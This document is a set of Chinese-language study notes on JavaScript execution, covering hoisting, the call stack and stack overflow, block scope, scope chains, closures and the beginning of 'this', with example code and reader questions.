debugger;
(function () {
  console.log(g);
  if (true) {
    console.log('hello world');
    function g() {
      return true;
    }
  }
})();
```

这个函数调试时，发现打印 g 时值是 undefined 而不是提示 not defined，说明 if 中 g 函数确实是提升了，但是为何不是 g()而是 undefined？然后走完 function g(){ return true; }这一步后 console.log(g)中的 g 才变为 g()。这里条件声明函数的变量提升有点搞不明白。

> ES 规定函数是不能在块级作用域中声明， function foo(){ if(true){ console.log(&#39;hello world&#39;); function g(){ return true; } } } 也就是说，上面这行代码执行会报错，但是个大浏览器都没有遵守这个标准。
>
> 接下来到了 ES6 了，ES6 明确支持块级作用域，ES6 规定块级作用域内部声明的函数，和通过 let 声明变量的行为类似。
>
> 规定的是理想的，但是还要照顾实现，要是完全按照 let 的方式来修订，会影响到以前老的代码，所以为了向下兼容，个大浏览器基本是按照下面的方式来实现的：
>
> function foo(){ if(true){ console.log(&#39;hello world&#39;); var g = function(){return true;}  
>  } }
>
> 这就解释了你的疑问，不过还是不建议在块级作用域中定义函数，很多时候，简单的才是最好的。

lexical scope 发生在编译阶段，会产生变量提升的效果； JavaScript 的 Dynamic Scope 发生在执行阶段，会产生 this binding, prototype chaining search 的过程；变量提升只提升声明(left hand）不提升赋值(right hand) function 的声明主要有: function declaration, function expression 其中 function declaration 会将方法体也提升，而 function expression 同变量提升一样，只会提升声明；变量提升在有 let 或者 const 的 block 中会出现 Temporal Dead Zone Error, 效果好似没有提升；另外要注意 block 内部的 var 变量能够穿透 block 提升到 global scope.

更多 JS 请了解： https://geekeast.github.io/jsscope.html

一段 javascript 代码进入编译阶段是会对函数体内的代码也进行编译，还是只是将函数体的代码存储在堆，在执行中遇到该函数再去编译？

> 函数只有在调用的时候才会被编译。

```
function func() {
  let a = 10;
  var a = 1;
}
```

上面的代码中，func 没有执行，引擎依然会报语法错误所以没有执行的代码也会编译的，这里应该是预编译的时候检查出的错误

> js 执行分三步：1.语法分析，2.预编译，3.执行，你这是发生在语法分析上。

## 调用栈

为什么 JavaScript 代码会出现栈溢出？

当一段代码**被执行时**，JavaScript 引擎先会对其进行编译，并创建执行上下文。（并不是任意一段代码都能产生执行上下文的。）但是并没有明确说明到底**什么样的代码才会产生执行上下文**？

那么接下来我们就来明确下，哪些情况下代码才算是“一段”代码，才会**在执行之前就进行编译并创建执行上下文**。一般说来，有这么三种情况：

1. 当 JavaScript 执行**全局代码**的时候，会**编译全局代码并创建全局执行上下文**，而且在整个页面的生存周期内，全局执行上下文只有一份。
2. 当**调用一个函数**的时候，函数体内的代码会被编译，并创建函数执行上下文，一般情况下，函数执行结束之后，创建的函数执行上下文会被销毁。
3. 当使用 eval 函数的时候，eval 的代码也会被编译，并创建执行上下文。

栈溢出的错误，如下图所示：

![img](https://static001.geekbang.org/resource/image/0c/70/0c9e2c4f7ee8ca59cfa99a6f51510470.png)

这涉及到了调用栈。 JavaScript 中有很多函数，经常会出现在一个函数中调用另外一个函数的情况，**调用栈就是用来管理函数调用关系的一种数据结构**。因此要讲清楚调用栈，你还要先弄明白函数调用和栈结构。

#### 什么是函数调用

函数调用就是运行一个函数，具体使用方式是使用函数名称跟着一对小括号。

```js
var a = 2;
function add() {
  var b = 10;
  return a + b;
}
add();
```

利用这段代码来解释下函数调用的过程。

在执行到函数 add() 之前，JavaScript 引擎会为上面这段代码创建全局执行上下文，包含了声明的函数和变量，你可以参考下图：

![img](https://static001.geekbang.org/resource/image/7f/da/7fa2ed18e702861890d767ea547533da.png)

从图中可以看出，代码中全局变量和函数都保存在全局上下文的变量环境中。

执行上下文准备好之后，便开始执行全局代码，当执行到 add 这儿时，JavaScript 判断这是一个函数调用，那么将执行以下操作：

- 首先，从全局执行上下文中，取出 add 函数代码。
- 其次，对 add 函数的这段代码进行编译，并创建该函数的执行上下文和可执行代码。
- 最后，执行代码，输出结果。

![img](https://static001.geekbang.org/resource/image/53/ca/537efd9e96771dc50737117e615533ca.png)

当执行到 add 函数的时候，有两个执行上下文了——全局执行上下文和 add 函数的执行上下文。

**在执行 JavaScript 时，可能会存在多个执行上下文，那么 JavaScript 引擎是如何管理这些执行上下文的呢？**

答案是通过一种叫栈的数据结构来管理的。那什么是栈呢？它又是如何管理这些执行上下文呢？

#### 栈

![img](https://static001.geekbang.org/resource/image/5e/05/5e2bb65019053abfd5e7710e41d1b405.png)

#### JavaScript 的调用栈

**JavaScript 引擎正是利用栈的这种结构来管理执行上下文的。在执行上下文创建好后，JavaScript 引擎会将执行上下文压入栈中**，通常把这种用来管理执行上下文的栈称为执行上下文栈，又称调用栈。

```js
var a = 2;
function add(b, c) {
  return b + c;
}
function addAll(b, c) {
  var d = 10;
  var result = add(b, c);
  return a + result + d;
}
addAll(3, 6);
```

在上面这段代码中，你可以看到它是在 addAll 函数中调用了 add 函数，那在整个代码的执行过程中，调用栈是怎么变化的呢？

下面我们就一步步地分析在代码的执行过程中，调用栈的状态变化情况。

第一步，**创建全局上下文，并将其压入栈底**。如下图所示：

![img](https://static001.geekbang.org/resource/image/a5/1d/a5d7ec1f8f296412acc045835b85431d.png)

变量 a、函数 add 和 addAll 都保存到了全局上下文的变量环境对象中。

全局执行上下文压入到调用栈后，JavaScript 引擎便开始执行全局代码了。首先会执行 a=2 的赋值操作，执行该语句会将全局上下文变量环境中 a 的值设置为 2。设置后的全局上下文的状态如下图所示：

![img](https://static001.geekbang.org/resource/image/1d/1d/1d50269dbc5b4c69f83662ecdd977b1d.png)

接下来，第二步是调用 addAll 函数。当调用该函数时，JavaScript 引擎会编译该函数，并为其创建一个执行上下文，最后还将该函数的执行上下文压入栈中，如下图所示：

![img](https://static001.geekbang.org/resource/image/7d/52/7d6c4c45db4ef9b900678092e6c53652.png)

addAll 函数的执行上下文创建好之后，便进入了函数代码的执行阶段了，这里先执行的是 d=10 的赋值操作，执行语句会将 addAll 函数执行上下文中的 d 由 undefined 变成了 10。

然后接着往下执行，第三步，当执行到 add 函数调用语句时，同样会为其创建执行上下文，并将其压入调用栈，如下图所示：

![img](https://static001.geekbang.org/resource/image/cc/37/ccfe41d906040031a7df1e4f1bce5837.png)

当 add 函数返回时，该函数的执行上下文就会从栈顶弹出，并将 result 的值设置为 add 函数的返回值，也就是 9。如下图所示：

![img](https://static001.geekbang.org/resource/image/03/96/03ca801a5372f941bf17d6088fee0f96.png)

紧接着 addAll 执行最后一个相加操作后并返回，addAll 的执行上下文也会从栈顶部弹出，此时调用栈中就只剩下全局上下文了。最终如下图所示：

![img](https://static001.geekbang.org/resource/image/d0/7b/d0ac1d6e77735338fa97cc9a3f6c717b.png)

至此，整个 JavaScript 流程执行结束了。

调用栈是 JavaScript 引擎追踪函数执行的一个机制，当一次有多个函数被调用时，通过调用栈就能够追踪到哪个函数正在被执行以及各函数之间的调用关系。

#### 如何利用好调用栈

##### 如何利用浏览器查看调用栈的信息

当你执行一段复杂的代码时，你可能很难从代码文件中分析其调用关系，这时候你可以在你想要查看的函数中加入断点，然后当执行到该函数时，就可以查看该函数的调用栈了。

你可以打开“开发者工具”，点击“Source”标签，选择 JavaScript 代码的页面，然后在第 3 行加上断点，并刷新页面。你可以看到执行到 add 函数时，执行流程就暂停了，这时可以通过右边“call stack”来查看当前的调用栈的情况，如下图：

![img](https://static001.geekbang.org/resource/image/c0/a2/c0d303a289a535b87a6c445ba7f34fa2.png)

从图中可以看出，右边的“call stack”下面显示出来了函数的调用关系：栈的最底部是 anonymous，也就是全局的函数入口；中间是 addAll 函数；顶部是 add 函数。这就清晰地反映了函数的调用关系，所以在分析复杂结构代码，或者检查 Bug 时，调用栈都是非常有用的。

除了通过断点来查看调用栈，你还可以使用 console.trace() 来输出当前的函数调用关系，比如在示例代码中的 add 函数里面加上了 console.trace()，你就可以看到控制台输出的结果，如下图：

![img](https://static001.geekbang.org/resource/image/ab/ce/abfba06cd23a7704a6eb148cff443ece.png)

##### 栈溢出（Stack Overflow）

调用栈是有大小的，当入栈的执行上下文超过一定数目，JavaScript 引擎就会报错，我们把这种错误叫做栈溢出。

```js
function division(a, b) {
  return division(a, b);
}
console.log(division(1, 2));
```

当执行时，就会抛出栈溢出错误，如下图：

![img](https://static001.geekbang.org/resource/image/b4/4d/b4f7196077d9ef4eac1ca6a279f2054d.png)

抛出的错误信息为：超过了最大栈调用大小（Maximum call stack size exceeded）。

那为什么会出现这个问题呢？这是因为当 JavaScript 引擎开始执行这段代码时，它首先调用函数 division，并创建执行上下文，压入栈中；然而，这个函数是递归的，并且没有任何终止条件，所以它会一直创建新的函数执行上下文，并反复将其压入栈中，但栈是有容量限制的，超过最大数量后就会出现栈溢出的错误。

理解了栈溢出原因后，你就可以使用一些方法来避免或者解决栈溢出的问题，比如**把递归调用的形式改造成其他形式（循环）**，或者使用**加入定时器的方法来把当前任务拆分为其他很多小任务**。

```js
function runStack(n) {
  if (n === 0) return 100;
  return runStack(n - 2);
}
runStack(50000);
```

这是一段递归代码，可以通过传入参数 n，让代码递归执行 n 次，也就意味着调用栈的深度能达到 n，当输入一个较大的数时，比如 50000，就会出现栈溢出的问题，那么你能优化下这段代码，以解决栈溢出的问题吗？

答案：

```js
// 不进栈，就不会栈溢出了
function runStack(n) {
  if (n === 0) return 100;
  return setTimeout(function () {
    runStack(n - 2);
  }, 0);
}
runStack(50000);
```

各大浏览器（除了 safari）没部署尾调用优化，直接在浏览器上的控制台上调试尾递归的代码还是会出现栈溢出的问题。另外思考题中本身就是尾递归。

老师题目中的递归本身就是在函数尾部递归，如果浏览器或者 node 等宿主环境实现了对尾部递归进行优化的话，那么就不会出现栈溢出的情况，我在 mac node 环境下试了下，老师的代码还是栈溢出了，这就说明我电脑的宿主环境没有对尾递归进行优化。

```JS
function runStack(n){
    while(true){
        if(n===0) return 100
		n = n-2
    }
}
```

**算法经典思想：循环消除尾递归**

疑问：调用栈是后进先出，那么当存在闭包时，某个函数的执行上下文还存在，那么其他函数的出栈是否受影响？

回答：执行上下文已经没了，只不过内部函数引用的变量还保存在堆上，所以不影响栈的操作。

## 块级作用域

由于 JavaScript 存在变量提升这种特性，从而导致了很多与直觉不符的代码，这也是 JavaScript 的一个重要设计缺陷。

ECMAScript6（以下简称 ES6）已经通过引入块级作用域并配合 let、const 关键字，来避开了这种设计缺陷，但是由于 JavaScript 需要保持向下兼容，所以**变量提升**在相当长一段时间内还会继续存在。所以既要理解新的机制，又要理解变量提升这套机制，关键这两套机制还是同时运行在“一套”系统中的。

**为什么在 JavaScript 中会存在变量提升，以及变量提升所带来的问题。**

#### 作用域（scope）

作用域是指**在程序中定义变量的区域**，**该区域决定了变量的生命周期**。通俗地理解，作用域就是变量与函数的可访问范围，即作用域控制着变量和函数的可见性和生命周期。

在 ES6 之前，ES 的作用域只有两种：全局作用域和函数作用域。

- 全局作用域中的对象在代码中的任何地方都能访问，其生命周期伴随着页面的生命周期。
- 函数作用域就是在函数内部定义的变量或者函数，并且定义的变量或者函数只能在函数内部被访问。函数执行结束之后，函数内部定义的变量会被销毁。

在 ES6 之前，JavaScript 只支持这两种作用域，相较而言，其他语言则都普遍支持块级作用域。块级作用域就是使用一对大括号包裹的一段代码，比如函数、判断语句、循环语句，甚至单独的一个{}都可以被看作是一个块级作用域。

```js
//if块
if (1) {
}

//while块
while (1) {}

//函数块
function foo() {}

//for循环块
for (let i = 0; i < 100; i++) {}

//单独一个块
{
}
```

如果一种语言支持块级作用域，那么其代码块内部定义的变量在代码块外部是访问不到的，并且等该代码块中的代码执行完成之后，代码块中定义的变量会被销毁。

和 Java、C/C++ 不同，ES6 之前是不支持块级作用域的，因为当初设计这门语言的时候，并没有想到 JavaScript 会火起来，所以只是按照最简单的方式来设计。**没有块级作用域**，再**把作用域内部的变量统一提升**无疑是最快速、最简单的设计，不过这也直接导致了函数中的变量无论是在哪里声明的，在编译阶段都会被提取到执行上下文的变量环境中，所以这些变量在整个函数体内部的任何地方都是能被访问的，这也就是 JavaScript 中的变量提升。

#### 变量提升所带来的问题

由于变量提升作用，使用 JavaScript 来编写和其他语言相同逻辑的代码，都有可能会导致不一样的执行结果。那为什么会出现这种情况呢？主要有以下两种原因。

1. **变量容易在不被察觉的情况下被覆盖掉**
2. **本应销毁的变量没有被销毁**

在函数的执行过程当中，js 会优先在当前的执行上下文中查找变量。

**如何通过块级作用域并配合 let 和 const 关键字来修复这种缺陷。**

let 关键字是支持块级作用域的，所以在编译阶段，JavaScript 引擎并不会把 if 块中通过 let 声明的变量存放到变量环境中，这也就意味着在 if 块通过 let 声明的关键字，并不会提升到全函数可见。（let 关键字支持块级作用域，所以在编译阶段，JavaScript 引擎并不会把块级作用域中的通过 let 声明的变量存放在变量环境中，这也就意味着在块级作用域中通过通过 let 声明的关键字并不会提升到全函数中可见。）

#### JavaScript 是如何支持块级作用域的

**在同一段代码中，ES6 是如何做到既要支持变量提升的特性，又要支持块级作用域的呢？**

站在执行上下文的角度来回答。

JavaScript 引擎是通过变量环境实现函数级作用域的，那么 ES6 又是如何在函数级作用域的基础之上，实现对块级作用域的支持呢？

```js
function foo() {
  var a = 1;
  let b = 2;
  {
    let b = 3;
    var c = 4;
    let d = 5;
    console.log(a);
    console.log(b);
  }
  console.log(b);
  console.log(c);
  console.log(d);
}
foo();
```

当执行上面这段代码的时候，JavaScript 引擎会先对其进行编译并创建执行上下文，然后再按照顺序执行代码，关于如何创建执行上下文我们在前面的文章中已经分析过了，但是现在的情况有点不一样，我们引入了 let 关键字，let 关键字会创建块级作用域，那么 let 关键字是如何影响执行上下文的呢？

上面这段代码的执行流程

第一步是编译并创建执行上下文，下面是我画出来的执行上下文示意图，你可以参考下：

![img](https://static001.geekbang.org/resource/image/f9/67/f9f67f2f53437218baef9dc724bd4c67.png)

通过上图，我们可以得出以下结论：

- **函数内部通过 var 声明的变量，在编译阶段全都被存放到变量环境里面了。**
- **通过 let 声明的变量，在编译阶段会被存放到词法环境（Lexical Environment）中，只提升创建不提升初始化，也就有了暂时性死区。**
- **在函数内部的作用域块中的其他块级作用里，通过 let 声明的变量并没有被存放到词法环境中。**

接下来，第二步继续执行代码，**当执行到代码块里面时**，变量环境中 a 的值已经被设置成了 1，词法环境中 b 的值已经被设置成了 2，这时候函数的执行上下文就如下图所示：

![img](https://static001.geekbang.org/resource/image/7e/fa/7e0f7bc362e0dea21d27dc5fb08d06fa.png)

从图中可以看出，当执行流程进入函数内部并开始执行块级作用域代码时，作用域块中通过 let 声明的变量，会被存放在词法环境的一个单独的区域中，这个区域中的变量并不影响作用域块外面的变量，比如在作用域外面声明了变量 b，在该作用域块内部也声明了变量 b，当执行到作用域内部时，它们都是独立的存在。

其实，**在词法环境内部，维护了一个小型栈结构**，栈底是函数最外层的词法变量环境，进入一个块级作用域后，就会把该块级作用域内部的词法变量环境压到栈顶；当块级作用域执行完成之后，该块级作用域的词法变量环境就会从栈顶弹出，这就是词法环境的结构。

再接下来，当执行到块级作用域中的 console.log(a)这行代码时，就需要在词法环境和变量环境中查找变量 a 的值了，具体查找方式是：沿着词法环境的栈顶向下查询，如果在词法环境中的某个块中查找到了，就直接返回给 JavaScript 引擎，如果没有查找到，那么继续在变量环境中查找。

这样一个变量查找过程就完成了，你可以参考下图：

![img](https://static001.geekbang.org/resource/image/06/08/06c06a756632acb12aa97b3be57bb908.png)

从上图你可以清晰地看出变量查找流程，不过要完整理解查找变量或者查找函数的流程，就涉及到作用域链了。

当作用域块执行结束之后，其内部定义的变量就会从词法环境的栈顶弹出，最终执行上下文如下图所示：

![img](https://static001.geekbang.org/resource/image/d4/28/d4f99640d62feba4202aa072f6369d28.png)

理解词法环境的结构和工作机制，**块级作用域就是通过词法环境的栈结构来实现的，而变量提升是通过变量环境来实现，通过这两者的结合，JavaScript 引擎也就同时支持了变量提升和块级作用域了。**

由于 JavaScript 的变量提升存在着变量覆盖、变量污染等设计缺陷，所以 ES6 引入了块级作用域关键字来解决这些问题。

通过对变量环境和词法环境栈的介绍，分析了 JavaScript 引擎是如何同时支持变量提升和块级作用域的。

每种语言其实都是在相互借鉴对方的优势，协同进化，比如 JavaScript 引进了块级作用域、迭代器和协程，其底层虚拟机的实现和 Java、Python 又是非常相似，也就是说如果你理解了 JavaScript 协程和 JavaScript 中的虚拟机，其实你也就理解了 Java、Python 中的协程和虚拟机的实现机制。

问题：

```js
let myname = '极客时间';
{
  console.log(myname);
  let myname = '极客邦';
}
```

回答：

```
【最终打印结果】：VM6277:3 Uncaught ReferenceError: Cannot access 'myname' before initialization
【分析原因】：在块级作用域内，let声明的变量被提升，但变量只是创建被提升，初始化并没有被提升，在初始化之前使用变量，就会形成一个暂时性死区。
【拓展】
var的创建和初始化被提升，赋值不会被提升。
let的创建被提升，初始化和赋值不会被提升。
function的创建、初始化和赋值均会被提升。
(应该是分创建，初始化，赋值三个步骤，不然按照文章提到的变量从词法环境到变量环境的查询方向，理论上还是可以打印出myname。正因为let没有初始化，所以暂时性死区中使用变量就会报错)
```

问题：有一个疑问，在 abcd 那个例子里，第一步<编译并创建执行上下文>的图里并没有块级作用域的 b=undefined; d=undefined。而在第二步里<继续执行代码>的图中才出现 b=undefined; d=undefined。想问下这个块级作用域的 b=undefined; d=undefined 是不是应该在第一步的编译阶段里就有。还是说在执行阶段像函数那样，块级作用域会有一个自己的编译阶段。

```
作者回复: 执行函数时才有进行编译，抽象语法树(AST）在进入函数阶段就生成了，并且函数内部作用域是已经明确了，所以进入块级作用域不会有编译过程，只不过通过let或者const声明的变量会在进入块级作用域的时被创建，但是在该变量没有赋值之前，引用该变量JavaScript引擎会抛出错误---这就是“暂时性死区”
```

问题：有个问题，在一个块级作用域中，let 和 const 声明的变量是在编译阶段被压入栈中还是执行阶段被压入栈中？在文中的表述来看，第一个 let 声明的变量是在编译阶段就压入栈中的，但是后面的变量又感觉是在执行是压入栈中。

```
作者回复: 对的，你的理解没错

函数只会在第一次执行的时候被编译，所以编译时变量环境和词法环境最顶层数据已经确定了。

当执行到块级作用域的时候，块级作用域中通过let和const申明的变量会被追加到词法环境中，当这个块执行结束之后，追加到词法作用域的内容又会销毁掉。
```

问题：看得很生气，全篇文章不提变量的「创建」「初始化」「赋值」这三种区别，把创建和初始化揉在一起了，也是看了精选留言里第一条评论之后 Google 才查找到，否则刚开始我真的不理解为啥都已经在词法环境找到了变量却报错了！按照这种理论的话，是否说明词法环境只有变量，并没有等于 undefined？

```
这一节主要是将var和let的区别以及底层实现机制的，我看你的疑问是下面这个问题：
function test(){
    console.log(a)
        let a = 7;
}
test()

执行test的时候，编译阶段a已经在内存中，为什么提前访问不了？

这主要是因为V8虚拟机做了限制，虽然a在内存中，但是当你在let a 之前访问a时，根据ECMAScript定义，虚拟机会阻止的访问！
```

## 作用域链和闭包

**什么是作用域**，以及 ES6 是如何通过**变量环境和词法环境**来同时支持变量提升和块级作用域，如何通过词法环境和变量环境来查找变量，这其中就涉及到作用域链的概念。

理解作用域链是理解闭包的基础，而闭包在 JavaScript 中几乎无处不在，同时作用域和作用域链还是所有编程语言的基础。

**什么是作用域链，并通过作用域链再来讲讲什么是闭包。**

```js
function bar() {
  console.log(myName);
}
function foo() {
  var myName = '极客邦';
  bar();
  console.log(myName);
}
var myName = '极客时间';
foo();
```

通过执行上下文来分析代码的执行流程

![img](https://static001.geekbang.org/resource/image/87/f7/87d8bbc2bb62b03131802fba074146f7.png)

第一反应是按照调用栈的顺序来查找变量，查找方式如下：

1. 先查找栈顶是否存在 myName 变量，但是这里没有，所以接着往下查找 foo 函数中的变量。
2. 在 foo 函数中查找到了 myName 变量，这时候就使用 foo 函数中的 myName。

如果按照这种方式来查找变量，那么最终执行 bar 函数打印出来的结果就应该是“极客邦”。如果你试着执行上述代码，你会发现打印出来的结果是“极客时间”。

#### 作用域链

**在每个执行上下文的变量环境中，都包含了一个外部引用，用来指向外部的执行上下文**，我们 把这个**外部引用称为 outer**。

当一段代码使用了一个变量时，JavaScript 引擎首先会在“当前的执行上下文”中查找该变量，比如上面那段代码在查找 myName 变量时，如果在当前的变量环境中没有查找到，那么 JavaScript 引擎会继续在 outer 所指向的执行上下文中查找。

![img](https://static001.geekbang.org/resource/image/20/a7/20a832656434264db47c93e657e346a7.png)

从图中可以看出，bar 函数和 foo 函数的 outer 都是指向全局上下文的，这也就意味着如果在 bar 函数或者 foo 函数中使用了外部变量，那么 JavaScript 引擎会去全局执行上下文中查找。我们把这个查找的链条就称为作用域链。

变量是通过作用域链来查找的了，不过还有一个疑问没有解开，foo 函数调用的 bar 函数，那为什么 bar 函数的外部引用是全局执行上下文，而不是 foo 函数的执行上下文？

要回答这个问题，你还需要知道什么是词法作用域。这是因为**在 JavaScript 执行过程中，其作用域链是由词法作用域决定的**。

#### 词法作用域

**词法作用域就是指作用域是由代码中函数声明的位置来决定的，所以词法作用域是静态的作用域，通过它就能够预测代码在执行过程中如何查找标识符。**

![img](https://static001.geekbang.org/resource/image/21/39/216433d2d0c64149a731d84ba1a07739.png)

从图中可以看出，词法作用域就是根据代码的位置来决定的，其中 main 函数包含了 bar 函数，bar 函数中包含了 foo 函数，因为 JavaScript 作用域链是由词法作用域决定的，所以整个词法作用域链的顺序是：foo 函数作用域—>bar 函数作用域—>main 函数作用域—> 全局作用域。

了解了词法作用域以及 JavaScript 中的作用域链，我们再回过头来看看上面的那个问题：在开头那段代码中，foo 函数调用了 bar 函数，那为什么 bar 函数的外部引用是全局执行上下文，而不是 foo 函数的执行上下文?

这是因为根据词法作用域，定义这两个函数时， foo 和 bar 的上级作用域都是全局作用域，所以如果 foo 或者 bar 函数使用了一个它们没有定义的变量，那么它们会到全局作用域去查找。也就是说，词法作用域是代码编译阶段就决定好的，和函数是怎么调用的没有关系。

#### 块级作用域中的变量查找

前面我们通过全局作用域和函数级作用域来分析了作用域链，那接下来我们再来看看块级作用域中变量是如何查找的？在编写代码的时候，如果你使用了一个在当前作用域中不存在的变量，这时 JavaScript 引擎就需要按照作用域链在其他作用域中查找该变量，如果你不了解该过程，那就会有很大概率写出不稳定的代码。

```js
function bar() {
  var myName = '极客世界';
  let test1 = 100;
  if (1) {
    let myName = 'Chrome浏览器';
    console.log(test);
  }
}
function foo() {
  var myName = '极客邦';
  let test = 2;
  {
    let test = 3;
    bar();
  }
}
var myName = '极客时间';
let myAge = 10;
let test = 1;
foo();
```

要想得出其执行结果，那接下来我们就得站在作用域链和词法环境的角度来分析下其执行过程。

ES6 是支持块级作用域的，当执行到代码块时，如果代码块中有 let 或者 const 声明的变量，那么变量就会存放到该函数的词法环境中。对于上面这段代码，当执行到 bar 函数内部的 if 语句块时，其调用栈的情况如下图所示：

![img](https://static001.geekbang.org/resource/image/25/a7/25053af5ae30c8be991fa14631cde0a7.png)

现在是执行到 bar 函数的 if 语块之内，需要打印出来变量 test，那么就需要查找到 test 变量的值，其查找过程我已经在上图中使用序号 1、2、3、4、5 标记出来了。

首先是在 bar 函数的执行上下文中查找，但因为 bar 函数的执行上下文中没有定义 test 变量，所以根据词法作用域的规则，下一步就在 bar 函数的外部作用域中查找，也就是全局作用域。

#### 闭包

```js
function foo() {
  var myName = '极客时间';
  let test1 = 1;
  const test2 = 2;
  var innerBar = {
    getName: function () {
      console.log(test1);
      return myName;
    },
    setName: function (newName) {
      myName = newName;
    }
  };
  return innerBar;
}
var bar = foo();
bar.setName('极客邦');
bar.getName();
console.log(bar.getName());
```

当执行到 foo 函数内部的 return innerBar 这行代码时调用栈的情况，可以参考下图：

![img](https://static001.geekbang.org/resource/image/d5/ef/d5587b76427a56c5f0b0571e4264b7ef.png)

从上面的代码可以看出，innerBar 是一个对象，包含了 getName 和 setName 的两个方法（通常我们把对象内部的函数称为方法）。你可以看到，这两个方法都是在 foo 函数内部定义的，并且这两个方法内部都使用了 myName 和 test1 两个变量。

根据词法作用域的规则，内部函数 getName 和 setName 总是可以访问它们的外部函数 foo 中的变量，所以当 innerBar 对象返回给全局变量 bar 时，虽然 foo 函数已经执行结束，但是 getName 和 setName 函数依然可以使用 foo 函数中的变量 myName 和 test1。所以当 foo 函数执行完成之后，其整个调用栈的状态如下图所示：

![img](https://static001.geekbang.org/resource/image/ee/3f/ee7c1ca481875ad4bdeb4383bd1f883f.png)

从上图可以看出，foo 函数执行完成之后，其执行上下文从栈顶弹出了，但是由于返回的 setName 和 getName 方法中使用了 foo 函数内部的变量 myName 和 test1，所以这两个变量依然保存在内存中。这像极了 setName 和 getName 方法背的一个专属背包，无论在哪里调用了 setName 和 getName 方法，它们都会背着这个 foo 函数的专属背包。

之所以是专属背包，是因为除了 setName 和 getName 函数之外，其他任何地方都是无法访问该背包的，我们就可以把这个背包称为 foo 函数的闭包。

在 JavaScript 中，根据词法作用域的规则，内部函数总是可以访问其外部函数中声明的变量，当通过调用一个外部函数返回一个内部函数后，即使该外部函数已经执行结束了，但是内部函数引用外部函数的变量依然保存在内存中，我们就把这些变量的集合称为闭包。比如外部函数是 foo，那么这些变量的集合就称为 foo 函数的闭包。

那这些闭包是如何使用的呢？当执行到 bar.setName 方法中的 myName = "极客邦"这句代码时，JavaScript 引擎会沿着“当前执行上下文–>foo 函数闭包–> 全局执行上下文”的顺序来查找 myName 变量，你可以参考下面的调用栈状态图：

![img](https://static001.geekbang.org/resource/image/50/46/50e4ba60fc7e420e83b35b95e379b246.png)

从图中可以看出，setName 的执行上下文中没有 myName 变量，foo 函数的闭包中包含了变量 myName，所以调用 setName 时，会修改 foo 闭包中的 myName 变量的值。

同样的流程，当调用 bar.getName 的时候，所访问的变量 myName 也是位于 foo 函数闭包中的。

也可以通过“开发者工具”来看看闭包的情况，打开 Chrome 的“开发者工具”，在 bar 函数任意地方打上断点，然后刷新页面，可以看到如下内容：

![img](https://static001.geekbang.org/resource/image/40/a8/40b8840480a5df4f43ad5f4e7907e3a8.png)

从图中可以看出来，当调用 bar.getName 的时候，右边 Scope 项就体现出了作用域链的情况：Local 就是当前的 getName 函数的作用域，Closure(foo) 是指 foo 函数的闭包，最下面的 Global 就是指全局作用域，从“Local–>Closure(foo)–>Global”就是一个完整的作用域链。

以后也可以通过 Scope 来查看实际代码作用域链的情况，这样调试代码也会比较方便。

#### 闭包是怎么回收的

闭包是什么时候销毁的。因为如果闭包使用不正确，会很容易造成内存泄漏的，关注闭包是如何回收的能让你正确地使用闭包。

通常，如果引用闭包的函数是一个全局变量，那么闭包会一直存在直到页面关闭；但如果这个闭包以后不再使用的话，就会造成内存泄漏。

如果引用闭包的函数是个局部变量，等函数销毁后，在下次 JavaScript 引擎执行垃圾回收时，判断闭包这块内容如果已经不再被使用了，那么 JavaScript 引擎的垃圾回收器就会回收这块内存。

所以在使用闭包的时候，你要尽量注意一个原则：如果该闭包会一直使用，那么它可以作为全局变量而存在；但如果使用频率不高，而且占用内存又比较大的话，那就尽量让它成为一个局部变量。

问题：

```js
var bar = {
  myName: 'time.geekbang.com',
  printName: function () {
    console.log(myName);
  }
};
function foo() {
  let myName = '极客时间';
  return bar.printName;
}
let myName = '极客邦';
let _printName = foo();
_printName();
bar.printName();
```

在上面这段代码中有三个地方定义了 myName，分析这段代码，你觉得这段代码在执行过程中会产生闭包吗？最终打印的结果是什么？

```js
var bar = {
    myName:"time.geekbang.com",
    printName: function () {
        console.log(myName)
    }
}
function foo() {
    let myName = " 极客时间 "
    return bar.printName
}
let myName = " 极客邦 "
let _printName = foo()
_printName()
bar.printName()


全局执行上下文：
变量环境：
Bar=undefined
Foo= function
词法环境：
myname = undefined
_printName = undefined

开始执行：
bar ={myname: "time.geekbang.com", printName: function(){...}}

myName = " 极客邦 "
 _printName = foo() 调用foo函数，压执行上下文入调用栈

foo函数执行上下文：
变量环境： 空
词法环境： myName=undefined
开始执行：
myName = " 极客时间 "
return bar.printName
开始查询变量bar， 查找当前词法环境（没有）->查找当前变量环境（没有） -> 查找outer词法环境（没有）-> 查找outer语法环境（找到了）并且返回找到的值
pop foo的执行上下文

_printName = bar.printName
printName（）压bar.printName方法的执行上下文入调用栈

bar.printName函数执行上下文：
变量环境： 空
词法环境： 空
开始执行：
console.log(myName)
开始查询变量myName， 查找当前词法环境（没有）->查找当前变量环境（没有） -> 查找outer词法环境（找到了）
打印" 极客邦 "
pop bar.printName的执行上下文


bar.printName() 压bar.printName方法的执行上下文入调用栈

bar.printName函数执行上下文：
变量环境： 空
词法环境： 空
开始执行：
console.log(myName)
开始查询变量myName， 查找当前词法环境（没有）->查找当前变量环境（没有） -> 查找outer词法环境（找到了）
打印" 极客邦 "
pop bar.printName的执行上下文





思考题：
这道题其实是个障眼法，只需要确定好函数调用栈就可以很轻松的解答，调用了foo()后，返回的是bar.printName，后续就跟foo函数没有关系了，所以结果就是调用了两次bar.printName()，根据词法作用域，结果都是“极客邦”，也不会形成闭包。
闭包还可以这样理解：当函数嵌套时，内层函数引用了外层函数作用域下的变量，并且内层函数在全局作用域下可访问时，就形成了闭包。
```

## this

JavaScript 作用域链是由词法作用域决定，而词法作用域是由代码结构来确定。

在对象内部的方法中使用对象内部的属性是一个非常普遍的需求。但是 JavaScript 的作用域机制并不支持这一点，基于这个需求，JavaScript 又搞出来另外一套 this 机制。

**作用域链和 this 是两套不同的系统，它们之间基本没太多联系。**

执行上下文中包含了变量环境、词法环境、外部环境，还有一个 this。

![img](https://static001.geekbang.org/resource/image/b3/8d/b398610fd8060b381d33afc9b86f988d.png)

this 是和执行上下文绑定的，也就是说每个执行上下文中都有一个 this。

执行上下文主要分为三种——全局执行上下文、函数执行上下文和 eval 执行上下文，所以对应的 this 也只有这三种——全局执行上下文中的 this、函数中的 this 和 eval 中的 this。

#### 全局执行上下文中的 this

全局执行上下文中的 this 是指向 window 对象的。这也是 this 和作用域链的唯一交点，作用域链的最底端包含了 window 对象，全局执行上下文中的 this 也是指向 window 对象。

#### 函数执行上下文中的 this

```js
function foo() {
  console.log(this);
}
foo();
```

